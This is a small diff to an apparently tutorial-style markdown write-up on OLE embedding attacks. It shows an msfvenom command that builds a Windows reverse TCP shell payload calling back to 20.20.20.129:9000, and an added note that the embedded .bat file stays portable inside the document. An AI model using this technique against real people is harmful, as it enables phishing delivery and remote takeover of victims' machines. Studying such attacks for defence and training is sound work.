@@ -169,3 +169,5 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=20.20.20.129 LPORT=9000 -f psh-c
 
 ## You will get back a shell if `'Run'` is clicked
 ![CSA-OLE-5](/Assets/CSA-Object-Linking-and-Embedding/CSA-OLE-5.jpg)
+
+## Note: the `.bat` file and the icon will remain within the document and will be portable with it.
